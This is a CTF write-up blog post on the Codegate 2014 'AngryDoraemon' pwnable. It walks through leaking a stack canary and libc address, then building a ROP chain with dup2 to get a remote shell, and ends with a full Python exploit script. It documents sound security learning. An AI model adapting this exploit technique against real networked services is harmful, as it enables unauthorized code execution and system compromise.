+++
author = "pwntester"
categories = ["pwnable", "aslr", "nx", "leak"]
date = 2014-03-21T22:09:00Z
description = ""
draft = false
slug = "codegate-2k14-angrydoraemon-pwnable-250-write-up"
tags = ["pwnable", "aslr", "nx", "leak"]
title = "Codegate 2k14 AngryDoraemon (pwnable 250) write up"

+++


This is an easy pwnable level but very interesting since there are many ways to exploit it so lets start checking the binary protections:

![](/images/octopress/angrybird-1.png)

Not bad, ASLR and NX enabled and the stack is protected with a Canary. Lets analyze what does it do ... Running the binary opens a socket in port 8888 which we can connect to and receive a menu with options to attack Doraemon:

![](/images/octopress/angrybird-2.png)

Normally I play with the binary and try to get a crash which is simple in this case, but this time I decided to do some Reversing that payed off very well, I found the following vulnerabilities:

* First Attack -> right attack: Allows us to enter any 4 bytes and call that address.
    - {% img center /images/angrybird-4.png %}
* Sword options leads to a portion of code that executes a shell :) However we cannot intereact with it :(
    - {% img center /images/angrybird-3.png %}
* Mouse attack -> are you sure? contains a buffer overflow, but the stack is protected with the canary
    - {% img center /images/angrybird-12.png %}
    - However we still get some output in the client:
    - {% img center /images/angrybird-5.png %}

That last vulnerability is interesting! not only allow us to influence EIP but also leak some bytes from memory! Lets see how it works. If we send yAAAA we get the following stack right before the "ret":

![](/images/octopress/angrybird-6.png)

We can see that ESP points to 0x0840492c5 that is the saved EIP, the dword before is the saved EBP and the one in 0xbffff95c is the canary (starting with a \x00). When the program prints "You choose xxxx" its printing a null terminated string starting at 0xbffff952

![](/images/octopress/angrybird-7.png)

This is really close to our canary so if we send some more As we can extend the string so it includes the bytes in the canary. Since it contains a null byte at the beggining, we have to overwrite it too so the strings get extended until next null. We need "y" + 10 "A"s. Actually, we can even include the saved EBP in the leak so we can use it as a reference to point to items in the stack. Cool!

Lets write a small script to leak the canary and EBP:

```lang-python line-numbers 
def get_canary(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print("[+] Wating for menu")
    time.sleep(3)
    # Receive menu
    s.recv(1024)
    s.send("4\n")
    time.sleep(1)
    print("[+] Sending mouse trap")
    payload = "y" + "A"*9 + "\n"
    s.send(payload)
    # Receive "are you sure?"
    message = s.recv(60)
    # Receive canary
    message = s.recv(60)
    canary_group = re.match(".*yAAAAAAAAA\n(.*)'!.*", message)
    canary = struct.unpack("<I", "\x00" + canary_group.group(1)[:3])[0]
    ebp = struct.unpack("<I", canary_group.group(1)[11:15])[0]
    eip = struct.unpack("<I", canary_group.group(1)[15:19])[0]
    print "[+] Got canary %#x" % canary
    print "[+] Got saved ebp %#x" % ebp
    print "[+] Got saved eip %#x" % eip
    s.close()
    return (canary, ebp, eip)
```

![](/images/octopress/angrybird-8.png)

Ok, now that we know the canary we can use it to influence EIP without firing all the alarms. Since the stack is not executable we will need a ROP chain to get code execution. My idea is to redirect stdin, stdout and stderr to the opened socket and then redirect the code flow to the original call to execl("/bin/sh") present in the code. But since the system has ASLR enabled we need to leak a libc address to calculate **dup2** address.

Since the PLT contains interesting functions like read or write, we can interact with the application. For example we can use the ROP chain to call **write** and send any number of bytes to the socket, even the whole binary (interesting for Blind ROP techniques). What content are we interested in? what about a resolved address in the GOT so we can leak a libc function address? That way and since the offsets will be constant, we can calculate any function address in libc. This is the script to leak any address from the GOT:

```lang-python line-numbers 
def leak_address(ip, port, canary, ebp, address, socketfd):
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.connect((ip, port))
    print("[+] Reconnecting")
    time.sleep(3)
    # Receive menu
    ss.recv(1024)
    ss.send("4\n")
    time.sleep(1)
    # Receive "are you sure?"
    ss.recv(60)
    print("[+] Sending leakage payload")
    leak_payload = ["y"*10,
                p(canary),
                "B"*8,
                p(ebp),
                p(0x080486e0), # write@plt
                p(0x41414141), # exit
                p(socketfd),  # socket fd
                p(address),  # write@got: address to read write@libc from
                p(4), # bytes to read
                "\n"]

    leak_payload = "".join(leak_payload)
    ss.send(leak_payload)
    leak = ss.recv(4)
    ss.close()
    return struct.unpack("<I", leak)[0]
```

In this case we use a ROP chain that calls "write" and reads 4 bytes from the GOT offset where write@libc is stored and send it to the socket fd.

![](/images/octopress/angrybird-9.png)

Now lets find out the offset between "write" and "dup2" in libc:

![](/images/octopress/angrybird-10.png)

Cool, so we now can call **dup2** to redirect the standard output and input to the socket, run our shell and interact with it. The payload looks like:

```lang-python line-numbers 
(canary, ebp, eip) = get_canary(ip, port)

write_addr = leak_address(ip, port, canary, ebp, 0x804b040, socketfd)

dup2_write_offset = 0x7d0
dup2_addr = write_addr + dup2_write_offset

print "[+] Leaked write address %#x" % write_addr
print "[+] Got dup2 address %#x" % dup2_addr

payload =   ["A"*10,
            p(canary),
            "B"*8,
            p(ebp),
            p(dup2_addr),
            p(0x080495be), # pop, pop, ret
            p(socketfd),  # fd 4
            p(0),  # fd 0
            p(dup2_addr),
            p(0x080495be), # pop, pop, ret
            p(socketfd),  # fd 4
            p(1),  # fd 1
            p(dup2_addr),
            p(0x080495be), # pop, pop, ret
            p(socketfd),  # fd 4
            p(2),  # fd 2
            p(0x08048c62), # call execl("/bin/sh")
            "\n"]
```

We basically call dup2 three times to redirect stdin, stdout and stderr to the socket and then we return to 0x08048c62 where there is a call to execl("/bin/sh"). Convenient, right? Now all we have to do is interact with the shell via the socket:

```lang-python line-numbers 
print "[+] Shell is waiting ..."
while True:
    sys.stdout.write("$ ")
    sys.stdout.flush()
    c = sys.stdin.readline()
    s.send(c)
    time.sleep(0.5)
    print s.recv(4095)
```

![](/images/octopress/angrybird-11.png)

Voila!

Full exploit:

```lang-python line-numbers 
import socket
import struct
import time
import sys
import re

def get_canary(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print("[+] Wating for menu")
    time.sleep(3)
    # Receive menu
    s.recv(1024)
    s.send("4\n")
    time.sleep(1)
    print("[+] Sending mouse trap")
    payload = "y" + "A"*9 + "\n"
    s.send(payload)
    # Receive "are you sure?"
    message = s.recv(60)
    # Receive canary
    message = s.recv(60)
    canary_group = re.match(".*yAAAAAAAAA\n(.*)'!.*", message)
    canary = struct.unpack("<I", "\x00" + canary_group.group(1)[:3])[0]
    ebp = struct.unpack("<I", canary_group.group(1)[11:15])[0]
    eip = struct.unpack("<I", canary_group.group(1)[15:19])[0]
    print "[+] Got canary %#x" % canary
    print "[+] Got saved ebp %#x" % ebp
    print "[+] Got saved eip %#x" % eip
    s.close()
    return (canary, ebp, eip)

def leak_address(ip, port, canary, ebp, address, socketfd):
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.connect((ip, port))
    print("[+] Reconnecting")
    time.sleep(3)
    # Receive menu
    ss.recv(1024)
    ss.send("4\n")
    time.sleep(1)
    # Receive "are you sure?"
    ss.recv(60)
    print("[+] Sending leakage payload")
    leak_payload = ["y"*10,
                p(canary),
                "B"*8,
                p(ebp),
                p(0x080486e0), # write@plt
                p(0x41414141), # exit
                p(socketfd),  # socket fd
                p(address),  # write@got: address to read write@libc from
                p(4), # bytes to read
                "\n"]

    leak_payload = "".join(leak_payload)
    ss.send(leak_payload)
    leak = ss.recv(4)
    ss.close()
    return struct.unpack("<I", leak)[0]

def ask_for_key():
    print "[+] Now change gdb affinity and press any key"
    input = raw_input()

def send_mouse_attack(s, payload):
    print("[+] Reconnecting")
    time.sleep(3)
    # Receive menu
    s.recv(1024)
    s.send("4\n")
    time.sleep(1)
    # Receive are you sure?
    s.recv(1024)
    print("[+] Sending payload")
    s.send(payload)

def p(addr):
    return struct.pack("<I", addr)


if __name__ == "__main__":
    ip = '127.0.0.1'
    port = 8888
    socketfd = 4

    (canary, ebp, eip) = get_canary(ip, port)

    write_addr = leak_address(ip, port, canary, ebp, 0x804b040, socketfd)

    dup2_write_offset = 0x7d0
    dup2_addr = write_addr + dup2_write_offset

    print "[+] Leaked write address %#x" % write_addr
    print "[+] Got dup2 address %#x" % dup2_addr

    payload =   ["A"*10,
                p(canary),
                "B"*8,
                p(ebp),
                p(dup2_addr),
                p(0x080495be), # pop, pop, ret
                p(socketfd),  # fd 4
                p(0),  # fd 0
                p(dup2_addr),
                p(0x080495be), # pop, pop, ret
                p(socketfd),  # fd 4
                p(1),  # fd 1
                p(dup2_addr),
                p(0x080495be), # pop, pop, ret
                p(socketfd),  # fd 4
                p(2),  # fd 2
                p(0x08048c62), # call execl("/bin/sh")
                "\n"]

    payload = "".join(payload)
    #ask_for_key()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    send_mouse_attack(s, payload)
    time.sleep(1)

    print "[+] Shell is waiting ..."
    while True:
        sys.stdout.write("$ ")
        sys.stdout.flush()
        c = sys.stdin.readline()
        s.send(c)
        time.sleep(0.5)
        print s.recv(4095)

    s.close()


```
